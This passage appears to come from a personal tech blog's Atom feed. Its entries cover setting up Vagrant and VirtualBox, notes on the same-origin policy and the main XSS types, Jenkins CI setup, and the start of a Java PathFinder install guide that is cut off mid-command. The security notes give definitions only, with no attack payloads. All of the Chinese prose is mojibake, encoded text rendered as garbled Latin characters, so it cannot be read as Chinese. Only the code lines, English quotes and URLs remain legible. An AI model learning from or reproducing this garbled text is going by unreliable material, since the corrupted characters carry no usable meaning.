rel="noopener">VirtureBox</a></li></ul><p>é¦–å…ˆï¼Œæˆ‘ä»¬è¦é€‰æ‹©ä¸€ä¸ªé€‚åˆæˆ‘ä»¬çš„ box ä¹Ÿå°±æ˜¯æ“ä½œç³»ç»Ÿã€‚Vagrant æä¾›äº†è®¸å¤š box ä¾›æˆ‘ä»¬ä½¿ç”¨ï¼š<a href="https://atlas.hashicorp.com/boxes/search" target="_blank" rel="noopener">Vagrant Box</a> ã€‚è¿™é‡Œï¼Œæµ·ç—´é€‰æ‹©çš„æ˜¯ ubuntu16.04ã€‚</p><p>é‚£ä¹ˆï¼Œå½“æˆ‘ä»¬è£…å¥½äº† Vagrantï¼ŒVirtureBoxï¼Œå¹¶ä¸”ä¸‹è½½å¥½æ‰€éœ€è¦çš„boxä»¥åï¼Œå°±å¯ä»¥å¼€å§‹æäº‹æƒ…äº†ã€‚å½“ç„¶ï¼Œä¸ºäº†æ¥ä¸‹æ¥çš„å‘å±•æ›´åŠ é¡ºåˆ©ï¼Œå¼ºçƒˆå»ºè®®è£…ä¸€ä¸ª Git ï¼Œæ¯•ç«Ÿ Git bash å¼‚å¸¸çš„å¥½ç”¨ã€‚</p><p>æˆ‘ä»¬æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå‘½åä¸º ubuntuï¼Œå¹¶ä¸”å°†æˆ‘ä»¬çš„ box ç§»åˆ°è¿™ä¸ªç›®å½•ä¸‹ã€‚åœ¨è¿™ä¸ªç›®å½•æ‰“å¼€å‘½ä»¤è¡Œç•Œé¢ï¼Œæ·»åŠ box</p><pre><code>$ vagrant box add xenial-server-cloudimg-amd64-vagrant.box</code></pre><p>æ·»åŠ åçš„ box å¯ä»¥ä½¿ç”¨ <code>vagrant box list</code> æ¥æŸ¥çœ‹<br>æ›´å¤šçš„ vagrant æ“ä½œï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡åšå®¢ <a href="https://segmentfault.com/a/1190000000264347" target="_blank" rel="noopener">ä½¿ç”¨ Vagrant æ‰“é€ è·¨å¹³å°å¼€å‘ç¯å¢ƒ</a></p><p>æ¥ä¸‹æ¥ï¼Œè¿è¡Œ <code>vagrant up</code> æ¥å¯åŠ¨è¿™ä¸ªè™šæ‹Ÿæœºã€‚è¿™æ˜¯ä¸€ä¸ªæ¼«é•¿çš„è¿‡ç¨‹ï¼Œå¦‚æœä½ ä½¿ç”¨ Windows å‘½ä»¤è¡Œï¼Œå¯èƒ½ä¼šæ›´æ…¢ã€‚</p><p><img src="/images/2017-05-17-11-28.png" alt="Picture"></p><p>ç»†å¿ƒåœ°ä½ å¦‚æœæ‰“å¼€ VirtureBoxï¼Œä¼šå‘ç°é‚£é‡Œå·²ç»æœ‰ä¸€ä¸ªè™šæ‹Ÿæœºèººç€å•¦</p><p>è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬çš„åä¸º ubuntu çš„æ–‡ä»¶å¤¹é‡Œé¢ä¼šå¤šå‡ ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­ Vagrantfile æ˜¯ Vagrant è™šæ‹Ÿæœºçš„é…ç½®æ–‡ä»¶ï¼Œè¿™ä¸ªå…ˆä¸ç”¨ç®¡ï¼Œä»¥åå†è¯´ã€‚</p><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡ ssh çš„æ–¹å¼è¿æ¥è™šæ‹Ÿæœºï¼ŒWindows å¯ä»¥ä½¿ç”¨ PuTTyï¼Œå½“ç„¶ï¼Œæˆ‘ä»¬çš„ Git bash å¸®æˆ‘ä»¬å‡†å¤‡å¥½äº†è¿™äº›ã€‚æ‰“å¼€ç»ˆç«¯ï¼ˆGit bashï¼‰ï¼Œæ‰§è¡Œ <code>vagrant ssh</code> ï¼Œæ€ä¹ˆæ ·ï¼Œæ˜¯ä¸æ˜¯çœ‹åˆ°äº†ä¸€ä¸ªé—ªé—ªå‘äº®çš„ Linuxï¼</p><p><img src="/images/2017-05-17-11-29.png" alt="Picture"></p><p>æ¥ä¸‹æ¥çš„é…ç½®å¤§å®¶å°±å¯ä»¥æŒ‰éœ€è¿›è¡Œæ‹‰ï¼Œå’Œ Vagrant å°±æ²¡æœ‰å¤ªå¤§å…³ç³»äº†ã€‚å½“ç„¶ï¼Œæœ‰ä¸€äº›é…ç½®æ˜¯éœ€è¦æ³¨æ„çš„ã€‚</p><h4 id="Vagrant-ç«¯å£è½¬å‘"><a href="#Vagrant-ç«¯å£è½¬å‘" class="headerlink" title="Vagrant ç«¯å£è½¬å‘"></a>Vagrant ç«¯å£è½¬å‘</h4><p>åœ¨ Vagrantfile é…ç½®æ–‡ä»¶ä¸­ï¼Œå–æ¶ˆä»¥ä¸‹å‡ è¡Œçš„æ³¨é‡Š</p><pre><code>config.vm.network &quot;forwarded_port&quot;, guest: 3306, host: 4567config.vm.network &quot;forwarded_port&quot;, guest: 80, host: 8080, host_ip: &quot;127.0.0.1&quot;config.vm.network &quot;private_network&quot;, ip: &quot;192.168.33.10&quot;</code></pre><p>è¯¥å‘½ä»¤å¯ä»¥å°†è™šæ‹Ÿæœºçš„ç«¯å£ä¸æœ¬æœºçš„ç«¯å£è¿›è¡Œå¯¹åº”ï¼Œå½“ç„¶ï¼Œæ ¹æ®éœ€è¦å¯ä»¥è¿›è¡Œæ›´å¤šçš„ç«¯å£è½¬å‘ï¼Œå…¶ä¸­ç¬¬ä¸‰è¡Œï¼Œå¯ä»¥ä¸è¿›è¡Œç«¯å£è½¬å‘ï¼Œç›´æ¥é€šè¿‡ ip åœ°å€è®¿é—®è™šæ‹Ÿæœºã€‚</p><h4 id="Vagrant-å…±äº«æ–‡ä»¶å¤¹"><a href="#Vagrant-å…±äº«æ–‡ä»¶å¤¹" class="headerlink" title="Vagrant å…±äº«æ–‡ä»¶å¤¹"></a>Vagrant å…±äº«æ–‡ä»¶å¤¹</h4><pre><code>config.vm.synced_folder &quot;../../../data/whc_web&quot;, &quot;/vagrant_data&quot;</code></pre><p>æ„å›¾å¾ˆæ¸…æ™°ï¼Œè¿™ä¹Ÿæ˜¯ Vagrant è™šæ‹Ÿæœºéå¸¸å¥½ç”¨çš„ä¸€ç‚¹ï¼Œå¯ä»¥åœ¨ä¸»æœºä½¿ç”¨ IDE è¿›è¡Œå†™ç ï¼Œç„¶ååœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œã€‚é…åˆä¸‹é¢çš„é¢„æ‰§è¡ŒSHELLè„šæœ¬æ•ˆæœæ›´ä½³</p><h4 id="Vagrant-é¢„æ‰§è¡Œè„šæœ¬"><a href="#Vagrant-é¢„æ‰§è¡Œè„šæœ¬" class="headerlink" title="Vagrant é¢„æ‰§è¡Œè„šæœ¬"></a>Vagrant é¢„æ‰§è¡Œè„šæœ¬</h4><pre><code>  config.vm.provision &quot;shell&quot;, inline: &lt;&lt;-SHELL    rm /var/www/html -rf    ln -s /vagrant_data /var/www/html  SHELL</code></pre><p>  åœ¨æ‰§è¡Œ <code>vagrant up</code> æŒ‡ä»¤æ—¶ä¼šæ‰§è¡Œï¼Œå¯æ ¹æ®éœ€è¦è‡ªå®šä¹‰ï¼Œä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯éœ€è¦æœ‰å¯¹åº”ç›®å½•çš„æƒé™ï¼Œå¯¹äº lemp å¼€å‘ç¯å¢ƒçš„åŒå­¦ï¼Œå°† /var/www/html è®¾ç½®æˆæ ¹ç›®å½•ï¼Œå¹¶è°ƒæ•´å¯¹åº”æƒé™ï¼ŒæŠŠé¡¹ç›®ä»£ç æ”¾ç€è¿™é‡Œå³å¯</p><h4 id="é€šè¿‡ä¸»æœºè¿æ¥-Vagrant-MySQL-æ•°æ®åº“"><a href="#é€šè¿‡ä¸»æœºè¿æ¥-Vagrant-MySQL-æ•°æ®åº“" class="headerlink" title="é€šè¿‡ä¸»æœºè¿æ¥ Vagrant MySQL æ•°æ®åº“"></a>é€šè¿‡ä¸»æœºè¿æ¥ Vagrant MySQL æ•°æ®åº“</h4><p>å®‰è£… MySQL å°±ä¸å¤šè¯´äº†ï¼Œå®‰è£…ä¹‹åéœ€è¦é…ç½®ä¸€ä¸‹<br> MySQL çš„é…ç½®æ–‡ä»¶ <code>my.cnf</code><br>æµ·ç—´çš„ <code>my.cnf</code> å®é™…ä¸Šå¼•ç”¨çš„é…ç½®æ–‡ä»¶åœ¨ <code>/etc/mysql/mysql.conf.d/mysqld.cnf</code> ä¿®æ”¹ä»¥ä¸‹è¡Œ</p><pre><code># bind-address = 127.0.0.1bind-address = 0.0.0.0</code></pre><p>é‡å¯ MySQL æœåŠ¡å°±å¯ä»¥äº†</p><h4 id="é€šè¿‡-PuTTy-ssh-è¿æ¥Vagrant"><a href="#é€šè¿‡-PuTTy-ssh-è¿æ¥Vagrant" class="headerlink" title="é€šè¿‡ PuTTy ssh è¿æ¥Vagrant"></a>é€šè¿‡ PuTTy ssh è¿æ¥Vagrant</h4><p>ç½‘ä¸Šè¯´çš„é»˜è®¤è´¦å·å¯†ç éƒ½æ˜¯ <code>vagrant</code> ç„¶è€Œæˆ‘çš„è´¦å·æ˜¯ <code>ubuntu</code> å¯†ç æ˜¯ç©ºï¼Œç„¶è€Œ ssh æ˜¯ä¸å…è®¸æ— å¯†ç è®¿é—®çš„ã€‚æ‰€ä»¥éœ€è¦å…ˆè®¾ç½® ubuntu è´¦æˆ·çš„å¯†ç ï¼Œæ‰å¯ä»¥æ­£å¸¸è®¿é—®ã€‚</p><h4 id="è®¾ç½®-hexo-åšå®¢æ—¶å‡ºç°çš„-npm-install-çš„é—®é¢˜"><a href="#è®¾ç½®-hexo-åšå®¢æ—¶å‡ºç°çš„-npm-install-çš„é—®é¢˜" class="headerlink" title="è®¾ç½® hexo åšå®¢æ—¶å‡ºç°çš„ npm install çš„é—®é¢˜"></a>è®¾ç½® hexo åšå®¢æ—¶å‡ºç°çš„ npm install çš„é—®é¢˜</h4><p>ç”±äº npm å®‰è£…æ—¶éœ€è¦ä¸å¤–éƒ¨å»ºç«‹è½¯é“¾ï¼Œè€Œ Windows åªæœ‰ç®¡ç†å‘˜æ‰å¯ä»¥è¿›è¡Œæ­¤æ“ä½œï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ç®¡ç†å‘˜æ¨¡å¼æ‰“å¼€å‘½ä»¤è¡Œç•Œé¢æ‰å¯ä»¥</p><p>å…¶ä½™çš„é‡åˆ°é—®é¢˜ä¸æ–­æ›´æ–°å§</p><p>åæ­£æˆ‘ä»¥åä¸ç”¨æ¥å›åˆ‡æ¢ç³»ç»Ÿäº†å•Šå“ˆå“ˆå“ˆå“ˆ</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä¸çŸ¥é“å¹¿å¤§ç¨‹åºå‘˜ä»¬æ˜¯æ€ä¹ˆå¤„ç† Windows å’Œ Linux çš„ï¼Œæœ€å¼€å§‹åœ¨ Windows ä¸‹é¢è·‘ Linux çš„è™šæ‹Ÿæœºï¼Œå¡çš„è‡ªå·±æ€€ç–‘äººç”Ÿã€‚åæ¥åšäº†ä¸ªåŒç³»ç»Ÿï¼Œè‡ªå·± 250 çš„å›ºæ€è¡¨ç¤ºæ ¹æœ¬ä¸å¤Ÿç”¨ï¼Œè€Œä¸”åŠ¨ä¸åŠ¨å…³æœºé‡å¯ï¼Œåˆ«é—®æˆ‘ä¸ºä»€ä¹ˆï¼Œæ¯•ç«Ÿ office å‰²èˆä¸äº†ã€‚åæ¥ä¸€ä¸ªå­¦é•¿ç‚¹äº†
      
    
    </summary>
    
      <category term="ä¸ªäººæ—¥è®°" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="è™šæ‹Ÿæœº" scheme="https://blog.liebes.top/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
      <category term="Vagrant" scheme="https://blog.liebes.top/tags/Vagrant/"/>
    
  </entry>
  
  <entry>
    <title>ç½‘ç»œå®‰å…¨å­¦ä¹ ä¹‹æµè§ˆå™¨å®‰å…¨</title>
    <link href="https://blog.liebes.top/2017/05/10/web-security-1/"/>
    <id>https://blog.liebes.top/2017/05/10/web-security-1/</id>
    <published>2017-05-10T14:32:43.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨çœ‹ã€Šç™½å¸½å­è®²WEBå®‰å…¨ã€‹è¿™æœ¬ä¹¦ï¼ŒæŒ‰ç€ç« èŠ‚è®°å½•ä¸€ä¸‹å®è·µå’Œå­¦ä¹ çš„è¿‡ç¨‹ã€‚</p><h3 id="åŒæºç­–ç•¥"><a href="#åŒæºç­–ç•¥" class="headerlink" title="åŒæºç­–ç•¥"></a>åŒæºç­–ç•¥</h3><blockquote><p>ç®€å•æ¥è¯´ï¼ŒåŒæºç­–ç•¥é™åˆ¶äº†æ¥è‡ªä¸åŒæºçš„â€œdocumentâ€æˆ–è„šæœ¬ï¼Œå¯¹å½“å‰â€œdocumentâ€è¯»å–æˆ–è®¾ç½®æŸäº›å±æ€§</p></blockquote><p>åŒæºçš„ç½‘ç«™æŒ‡èµ·hoståœ°å€æ˜¯ä¸€è‡´çš„</p><p>æ¯”å¦‚ä»¥ä¸‹å‡ ä¸ªåœ°å€</p><ol><li><a href="http://store.company.com/dir2/index.html" target="_blank" rel="noopener">http://store.company.com/dir2/index.html</a></li><li><a href="http://store.company.com/dir1/index.html" target="_blank" rel="noopener">http://store.company.com/dir1/index.html</a></li><li><a href="https://store.company.com/dir1/index.html" target="_blank" rel="noopener">https://store.company.com/dir1/index.html</a></li><li><a href="http://store.company.com:8080/dir2/index.html" target="_blank" rel="noopener">http://store.company.com:8080/dir2/index.html</a></li><li><a href="http://news.company.com/dir1/index.html" target="_blank" rel="noopener">http://news.company.com/dir1/index.html</a></li></ol><p>å…¶ä¸­1,2æ˜¯åŒæºçš„ï¼Œè€Œå…¶ä»–å‡ ä¸ªåˆ™ä¸æ˜¯ã€‚</p><p>å¯¹äºä¸€ä¸ªç½‘é¡µä¸­åŠ è½½çš„javascriptèµ„æºè€Œè¨€ï¼Œå…¶åŸŸæ˜¯å½“å‰æ‰“å¼€çš„é¡µé¢</p><p>æ¯”å¦‚åœ¨a.comä¸­å¼•ç”¨äº†b.comä¸­çš„æ–‡ä»¶</p><pre><code>&lt;script src=&quot;http://b.com/b.js&quot;&gt;&lt;/script&gt;</code></pre><p>å…¶ä¸­b.jsçš„æºæ˜¯a.comè€Œéb.com</p><h3 id="XSSç®€ä»‹"><a href="#XSSç®€ä»‹" class="headerlink" title="XSSç®€ä»‹"></a>XSSç®€ä»‹</h3><p>è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œå…¨ç§°æ˜¯ Cross Site Scriptã€‚XSSæ”»å‡»é€šå¸¸æŒ‡é»‘å®¢é€šè¿‡â€œHtml æ³¨å…¥â€ç¯¡æ”¹äº†ç½‘é¡µï¼Œæ’å…¥æ¶æ„çš„è„šæœ¬ï¼Œä»è€Œåœ¨æµè§ˆç½‘é¡µæ—¶ï¼Œæ§åˆ¶ç”¨æˆ·æµè§ˆå™¨çš„ä¸€ç§æ”»å‡»ã€‚</p><h4 id="åå°„å‹XSS"><a href="#åå°„å‹XSS" class="headerlink" title="åå°„å‹XSS"></a>åå°„å‹XSS</h4><p>åå°„å‹XSSåªæ˜¯ç®€å•åœ°æŠŠç”¨æˆ·è¾“å…¥çš„æ•°æ®â€œåå°„â€ç»™æµè§ˆå™¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œé»‘å®¢éœ€è¦è¯±ä½¿ç”¨æˆ·ç‚¹å‡»ä¸€ä¸ªæ¶æ„é“¾æ¥ï¼Œæ‰èƒ½æ”»å‡»æˆåŠŸã€‚åå°„å‹XSSä¹Ÿå«åšâ€œéæŒä¹…å‹CSSâ€ï¼ˆNon-persistent XSSï¼‰</p><h4 id="å‚¨å­˜å‹XSS"><a href="#å‚¨å­˜å‹XSS" class="headerlink" title="å‚¨å­˜å‹XSS"></a>å‚¨å­˜å‹XSS</h4><p>å‚¨å­˜å‹XSSä¼šæŠŠç”¨æˆ·è¾“å…¥çš„æ•°æ®â€œå‚¨å­˜â€åœ¨æœåŠ¡å™¨ç«¯ã€‚è¿™ç§XSSå…·æœ‰å¾ˆå¼ºçš„ç¨³å®šæ€§ã€‚</p><h4 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM Based XSS"></a>DOM Based XSS</h4><p>DOM Based XSS ä»æœ¬è´¨ä¸Šæ¥è¯´ä¹Ÿæ˜¯åå°„å‹XSSã€‚å•ç‹¬åˆ’åˆ†å‡ºæ¥æ˜¯å› ä¸ºDOM Based XSSçš„å½¢æˆåŸå› æ¯”è¾ƒç‰¹åˆ«ã€‚é€šè¿‡ä¿®æ”¹é¡µé¢çš„DOMèŠ‚ç‚¹å½¢æˆçš„XSSï¼Œç§°ä¹‹ä¸ºDOM Based XSSã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æœ€è¿‘åœ¨çœ‹ã€Šç™½å¸½å­è®²WEBå®‰å…¨ã€‹è¿™æœ¬ä¹¦ï¼ŒæŒ‰ç€ç« èŠ‚è®°å½•ä¸€ä¸‹å®è·µå’Œå­¦ä¹ çš„è¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;h3 id=&quot;åŒæºç­–ç•¥&quot;&gt;&lt;a href=&quot;#åŒæºç­–ç•¥&quot; class=&quot;headerlink&quot; title=&quot;åŒæºç­–ç•¥&quot;&gt;&lt;/a&gt;åŒæºç­–ç•¥&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;ç®€å•æ¥è¯´ï¼Œ
      
    
    </summary>
    
      <category term="å®‰å…¨" scheme="https://blog.liebes.top/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ç½‘ç»œå®‰å…¨" scheme="https://blog.liebes.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://blog.liebes.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Jenkins å®‰è£…ä¸ä½¿ç”¨</title>
    <link href="https://blog.liebes.top/2017/04/14/SoftwareManagement-HW-2/"/>
    <id>https://blog.liebes.top/2017/04/14/SoftwareManagement-HW-2/</id>
    <published>2017-04-14T15:55:26.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>Jenkinsæ—¨åœ¨ç¼–ç¨‹çš„æŒç»­ç»§æ‰¿ï¼Œæµ‹è¯•éƒ¨ç½²è‡ªåŠ¨åŒ–ï¼Œå®˜æ–¹ç»™çš„ç®€ä»‹å¦‚ä¸‹ï¼š</p><blockquote><p>Jenkins is a self-contained, open source automation server which can be used to automate all sorts of tasks such as building, testing, and deploying software. Jenkins can be installed through native system packages, Docker, or even run standalone by any machine with the Java Runtime Environment installed.</p></blockquote><p>é¦–å…ˆä¸‹è½½ Jenkins çš„waråŒ…<br><a href="http://mirrors.jenkins.io/war-stable/latest/jenkins.war" target="_blank" rel="noopener">jenkins.war</a><br>è¿è¡Œå‘½ä»¤</p><pre><code>$ java -jar jenkins.war</code></pre><p>è¯¥å‘½ä»¤ä¼šåœ¨æœ¬åœ°çš„8080ç«¯å£è¿è¡Œjenkins<br>è®¿é—® <code>localhost:8080</code> ä¼šçœ‹åˆ°jenkins çš„æ¬¢è¿ç•Œé¢ï¼ŒæŒ‰ç…§æ­¥éª¤ä¾æ¬¡è¿›è¡Œè®¾ç½®ã€‚<br>åœ¨å®‰è£…æ’ä»¶çš„ç•Œé¢ï¼Œé€‰æ‹©é»˜è®¤å³å¯ï¼Œjenkinsä¼šå¸®ä½ å®‰è£…ä¸€äº›å¸¸è§çš„æ’ä»¶ï¼Œæ¯”å¦‚gitï¼Œpipelineç­‰<br>è®¾ç½®ç»“æŸåä¼šçœ‹åˆ°å¦‚ä¸‹ç•Œé¢<br><img src="/images/2017-4-24-14-7.png" alt="pictures"><br>ç‚¹å‡»å·¦ä¸Šè§’æ–°å»ºæŒ‰é’®ï¼Œå³å¯æ–°å»ºä¸€ä¸ªé¡¹ç›®ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©æ–°å»ºä¸€ä¸ªmavené¡¹ç›®ã€‚åœ¨github projecté€‰é¡¹ä¸Šé€‰æ‹©æˆ‘ä»¬çš„githubåœ°å€<br><img src="/images/2017-04-24-14-26.png" alt="pictures"><br>åœ¨æºç ç®¡ç†è®¾ç½®ä¸Šé€‰æ‹©gitï¼Œå¹¶è®¾ç½®é»˜è®¤ç¼–è¯‘çš„åˆ†æ”¯ä¸ºä¸»åˆ†æ”¯<br><img src="/images/2017-04-24-14-28.png" alt="pictures"><br>åœ¨æ„å»ºè§¦å‘å™¨è®¾ç½®ä¸Šï¼Œé€‰æ‹©Poll SCM å¹¶åœ¨æ—¥ç¨‹è¡¨é‡Œé¢è¾“å…¥<code>* * * * *</code>è¡¨ç¤ºæ¯ä¸€åˆ†é’Ÿå°±ä¼šæ‰§è¡Œä¾æ¬¡æ„å»º<br><img src="/images/2017-04-24-14-30.png" alt="pictures"><br>åœ¨æ„å»ºçš„ä½ç½®ï¼Œé€‰æ‹©æ–°å¢ä¸€ä¸ªshell å¹¶è¾“å…¥<code>mvn test</code><br><img src="/images/2017-04-24-14-34.png" alt="pictures"><br>ç‚¹å‡»ä¿å­˜åå³å¯<br>æ­¤åæ¯ä¸€æ¬¡å°†ä»£ç æ›´æ–°åˆ°githubä¹‹åï¼Œjenkinsä¼šè‡ªåŠ¨è¿›è¡Œæ£€æµ‹ï¼ŒåŒæ—¶åœ¨æ¯æ¬¡æ„å»ºæ—¶ä¼šè‡ªåŠ¨è¿›è¡Œæµ‹è¯•ã€‚åœ¨Consloe Outputä¸­å¯ä»¥çœ‹åˆ°æµ‹è¯•ç»“æœ<br><img src="/images/2017-04-24-14-42.png" alt="pictures"><br><img src="/images/2017-04-24-14-43.png" alt="pictures"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Jenkinsæ—¨åœ¨ç¼–ç¨‹çš„æŒç»­ç»§æ‰¿ï¼Œæµ‹è¯•éƒ¨ç½²è‡ªåŠ¨åŒ–ï¼Œå®˜æ–¹ç»™çš„ç®€ä»‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Jenkins is a self-contained, open source automation server which can be used to au
      
    
    </summary>
    
      <category term="ä½œä¸š" scheme="https://blog.liebes.top/categories/%E4%BD%9C%E4%B8%9A/"/>
    
    
      <category term="è½¯ä»¶é¡¹ç›®ç®¡ç†ä½œä¸š" scheme="https://blog.liebes.top/tags/%E8%BD%AF%E4%BB%B6%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E4%BD%9C%E4%B8%9A/"/>
    
  </entry>
  
  <entry>
    <title>ã€è½¯ä»¶æµ‹è¯•ã€‘JAVA PATH FINDER [JPF]</title>
    <link href="https://blog.liebes.top/2017/04/08/SoftwareTest-HW-4/"/>
    <id>https://blog.liebes.top/2017/04/08/SoftwareTest-HW-4/</id>
    <published>2017-04-08T15:07:09.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>è½¯ä»¶æµ‹è¯•å°ç»„ä½œä¸šä¹‹JPF</p><p>é¦–å…ˆå…ˆè¯´è¯´JPFæ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿</p><p>å®˜æ–¹ç»™å‡ºçš„è§£é‡Šï¼š</p><blockquote><p>JPFæ ¸å¿ƒæ˜¯ç”¨äºJavaâ„¢å­—èŠ‚ç çš„è™šæ‹Ÿæœºï¼ˆVMï¼‰ï¼Œè¿™æ„å‘³ç€å®ƒæ˜¯ä¸€ä¸ªç¨‹åºï¼Œæ‚¨å¯ä»¥è®©Javaç¨‹åºæ‰§è¡Œã€‚å®ƒç”¨äºåœ¨è¿™äº›ç¨‹åºä¸­æ‰¾åˆ°ç¼ºé™·ï¼Œå› æ­¤æ‚¨è¿˜éœ€è¦ç»™å‡ºå±æ€§ä»¥ä½œä¸ºè¾“å…¥è¿›è¡Œæ£€æŸ¥ã€‚ JPFé€šè¿‡ä¸€ä»½æŠ¥å‘Šæ¥å›å¤ï¼Œè¯¥æŠ¥å‘Šè¯´å¦‚æœå±æ€§æŒæœ‰å’Œ/æˆ–ç”±JPFåˆ›å»ºçš„éªŒè¯å·¥ä»¶è¿›è¡Œè¿›ä¸€æ­¥åˆ†æï¼ˆå¦‚æµ‹è¯•ç”¨ä¾‹ï¼‰ã€‚</p></blockquote><blockquote><p>JPFæ˜¯ä¸€ä¸ªæœ‰å‡ ä¸ªæ‰­æ›²çš„è™šæ‹Ÿæœºã€‚å®ƒåœ¨Javaæœ¬èº«ä¸­å®ç°ï¼Œæ‰€ä»¥ä¸è¦æŒ‡æœ›å®ƒåƒæ‚¨çš„æ™®é€šJavaä¸€æ ·å¿«é€Ÿè¿è¡Œã€‚å®ƒæ˜¯åœ¨VMä¸Šè¿è¡Œçš„VMã€‚è™½ç„¶Javaå­—èŠ‚ç çš„æ‰§è¡Œè¯­ä¹‰åœ¨<a href="http://java.sun.com/docs/books/jvms/second_edition/html/VMSpecTOC.doc.html/" target="_blank" rel="noopener">http://java.sun.com/docs/books/jvms/second_edition/html/VMSpecTOC.doc.html/</a> Sunçš„Javaè™šæ‹Ÿæœºè§„èŒƒä¸­æœ‰æ˜ç¡®å®šä¹‰ï¼Œä½†æˆ‘ä»¬åœ¨JPFä¸­å‡ ä¹æ²¡æœ‰ç¡¬è¿çº¿è¯­ä¹‰ - VMæŒ‡ä»¤é›†ç”±ä¸€ç»„å¯è¢«æ›¿æ¢çš„ç±»è¡¨ç¤ºã€‚</p></blockquote><blockquote><p>é»˜è®¤æŒ‡ä»¤é›†ä½¿ç”¨ä¸‹ä¸€ä¸ªJPFåŠŸèƒ½ï¼šæ‰§è¡Œé€‰é¡¹ã€‚ JPFå¯ä»¥è¯†åˆ«æ‚¨çš„ç¨‹åºä¸­çš„æ‰§è¡Œå¯èƒ½ä¸åŒçš„è¿›ç¨‹ï¼Œç„¶åç³»ç»Ÿåœ°æ¢ç´¢æ‰€æœ‰è¿™äº›ç‚¹ã€‚è¿™æ„å‘³ç€JPFï¼ˆç†è®ºä¸Šï¼‰é€šè¿‡ç¨‹åºæ‰§è¡Œæ‰€æœ‰è·¯å¾„ï¼Œè€Œä¸ä»…ä»…æ˜¯åƒæ™®é€šçš„VMé‚£æ ·ã€‚å…¸å‹çš„é€‰æ‹©æ˜¯ä¸åŒçš„è°ƒåº¦åºåˆ—æˆ–éšæœºå€¼ï¼Œä½†JPFå¯ä»¥å†æ¬¡ä»‹ç»æ‚¨è‡ªå·±çš„ç±»å‹ï¼Œå¦‚ç”¨æˆ·è¾“å…¥æˆ–statemachineäº‹ä»¶ã€‚</p></blockquote><p>ä¸ªäººè§‰å¾—JPFæ˜¯ä¸€ä¸ªé’ˆå¯¹JAVAç¨‹åºå¯»æ‰¾å¯æ‰§è¡Œè·¯å¾„çš„å·¥å…·ã€‚çœ‹äº†ä¸€ä¸‹å®˜æ–¹çš„ä¾‹å­ï¼Œè§‰å¾—JPFå¯ä»¥åœ¨JAVAç¨‹åºæ‰§è¡Œæ—¶è‡ªåŠ¨æ£€æµ‹æ‰€æœ‰çš„å¯æ‰§è¡Œè·¯å¾„ï¼Œæ‰¾åˆ°å¯èƒ½å‡ºç°é—®é¢˜çš„è·¯å¾„ã€‚ä¸åŒäºä¼ ç»Ÿçš„åŸºäºç”¨ä¾‹çš„Testingï¼ŒJPFé‡‡ç”¨çš„æ˜¯Model Checkingï¼Œå°½ç®¡åŸºäºç”¨ä¾‹çš„æµ‹è¯•åœ¨ç”¨ä¾‹è¶³å¤Ÿå¤šçš„æ—¶å€™æœ‰ç€å¾ˆä¸é”™çš„æµ‹è¯•æ•ˆæœï¼Œä½†æ˜¯å¾ˆéš¾ä¿è¯æµ‹è¯•åˆ°æ‰€æœ‰çš„å¯è¡Œè·¯å¾„ã€‚JPFå®˜æ–¹ç»™å‡ºäº†åŸºäºæµ‹è¯•ç”¨ä¾‹çš„Testing ä¸ Model Testing çš„å·®åˆ«ï¼š<a href="http://babelfish.arc.nasa.gov/trac/jpf/wiki/intro/testing_vs_model_checking" target="_blank" rel="noopener">testing_vs_model_checking</a></p><p>é‚£ä¹ˆè¯´è¯´JPFå®‰è£…çš„æ–¹å¼ï¼ŒJPFå®‰è£…éœ€è¦ä½¿ç”¨ä¸€ä¸ªç±»ä¼¼äºgitçš„ç®¡ç†å·¥å…·ï¼šMercurialï¼ŒåŒæ—¶éœ€è¦JUNITï¼Œä¸Apache antã€‚<br>å®‰è£…ä¹‹å‰æˆ‘ä»¬éœ€è¦å…ˆä¸‹è½½Mercuial å’Œ ant</p><pre><code>$ sudo apt install mercurial$ sudo apt install ant</code></pre><p>ç”±äºæˆ‘ä½¿ç”¨çš„IDEæ˜¯ idea ,è‡ªå¸¦äº†JUNITçš„åŒ…ï¼Œæ²¡æœ‰çš„éœ€è¦å»ä¸‹è½½ä¸€ä¸‹ã€‚<br>éœ€è¦å°†JUNITåŒ…çš„ç›®å½•åŠ å…¥åˆ°ç¯å¢ƒå˜é‡ä¸­</p><pre><code>$ sudo vi /etc/provileexport JUNIT_HOME=/home/hardy/app/idea-IU-163.13906.18/libexport CLASSPATH=.:$CLASSPATH:$JUNIT_HOME/junit-4.12.jar$ source /etc/provile</code></pre><p>ä½¿ç”¨Mercuialä¸‹è½½jpf-coreçš„ä»“åº“</p><pre><code>$ hg clone 